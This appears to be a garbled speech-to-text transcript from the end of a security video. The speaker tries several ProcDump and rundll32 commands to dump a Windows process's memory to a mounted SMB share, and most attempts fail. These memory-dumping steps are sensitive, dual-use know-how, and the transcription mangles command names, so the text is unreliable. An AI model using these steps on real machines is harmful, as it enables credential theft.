one is one eight five five one nine if we xxd this right away do we start seeing data no but who knows we'll probably get data eventually so again gonna pause the video it'll probably take five minutes just like the last one and we'll see if this one works if not we will try the next pid which is five seven three two this one gave us a like error message right away last time so we'll try that i don't know why i'm going down this rabbit hole when this video has to be like encoded and published in probably like 15 hours now but oh well i like to live dangerously sometimes so the second update has done and we don't really have anything uh i guess we can try the last one proc dump64.edu except yola 5732 i wonder if there's like an all flag in proc dump that i'm not doing um let's see dash a debug cpu threshold write a dump dash f filter exclude write dump as hung window let's dull kill debug let's see maybe a flag i'm just not doing capture 32 of 32 and 64. let's try this um 57.32 let's just see if it accepts i'm expecting it to display an error pretty quickly um no process matching 5732 let's see powershell get process sticky 5732 does exist but it did not dumb five seven three two okay so maybe there's just something i'm not doing or maybe you can't do it this way i thought it'd be fun to play with it um let's try to run dll32 again it is this 6124-4 paste let's see let's do z colon backslash let's try this did that right z colon i don't see test.dump so what's probably happening is when we invoke it this way it just doesn't have access to uh network shares and that may just be how we're doing the net use command it may be this just doesn't let remote shares but something definitely funky is happening here but i think that's why i'm gonna wrap up the video um if i come across a better way to dump it i may add this but yeah i hope you guys enjoyed it take care and i'll see you all next week so i'm going to try one last thing so i'm going to try the proc dump command again uh it's not the right window product dump and we're going to specify um m a as the flag so six one two four is what we want so dot slash proc dump sixty four dot exe dash m a uh let's do accept yola dash m a six one two four and see if this works oh god it looks like m a did the trick this one's gonna be 208 megs which is a huge difference then like 32k or whatever that was if you look at smb it is yeah 32k or these are bigger at 152 but yeah this is gonna be huge it'll take quite a while to dump so i'm just gonna let my box idle it looks like the dump finally finished but i'm not happy with one megabyte written so chances are this failed yet again not sure exactly why but hopefully if you read the comment someone will point it out or maybe it's just it doesn't like my network mount but if we go to cdsmb and cat this it is just as bare as before so well unfortunately that'll be the end of the video hope you guys enjoyed it take care and i'll see you all next week